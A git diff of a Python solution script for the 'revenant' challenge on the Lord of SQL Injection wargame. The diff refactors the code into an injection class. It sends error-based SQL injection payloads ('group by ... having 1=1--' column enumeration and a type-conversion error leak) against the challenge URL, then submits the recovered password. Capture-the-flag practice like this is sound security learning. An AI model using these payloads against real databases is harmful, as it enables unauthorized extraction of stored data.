@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
@@ -19,37 +20,33 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/revenant_05b27d7dea5f124118e48899d46e0b5b.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
 
-    param = dict(
-        pw="' group by pw having 1=1--")
-    los.resp_with_message(url, param, cook)
+    payload = "' group by pw having 1=1--"
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    p.resp_with_message()
 
-    param = dict(
-        pw="' group by pw,id having 1=1--")
-    los.resp_with_message(url, param, cook)
+    p.payload = "' group by pw,id having 1=1--"
+    p.resp_with_message()
 
-    param = dict(
-        pw="' group by pw,id,[45a88487] having 1=1--")
-    los.resp_with_message(url, param, cook)
+    p.payload = "' group by pw,id,[45a88487] having 1=1--"
+    p.resp_with_message()
 
-    param = dict(
-        pw="' group by pw,id,[45a88487],[13477a35] having 1=1--")
-    los.resp_with_message(url, param, cook)
+    p.payload = "' group by pw,id,[45a88487],[13477a35] having 1=1--"
+    p.resp_with_message()
 
-    param = dict(
-        pw="' group by pw,id,[45a88487],[13477a35],[9604b0c8] having 1=1--")
-    los.resp_with_message(url, param, cook)
+    p.payload = "' group by pw,id,[45a88487],[13477a35],[9604b0c8] having 1=1--"
+    p.resp_with_message()
 
-    param = dict(
-        id="admin' and \"9604b0c8\"=1 --")
-    los.resp_with_message(url, param, cook, text="Conversion failed")
+    p.payload = "admin' and \"9604b0c8\"=1 --"
+    p.resp_with_message(text="Conversion failed")
 
-    param = dict(pw='aa68a4b3fb327dee07f868450f7e1183')
-    response = los.get_request(url, param, cook)
-
+    p.payload = 'aa68a4b3fb327dee07f868450f7e1183'
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Revenant Clear!')
+        print('\nRevenant Clear!')
 
 
 if __name__ == '__main__':
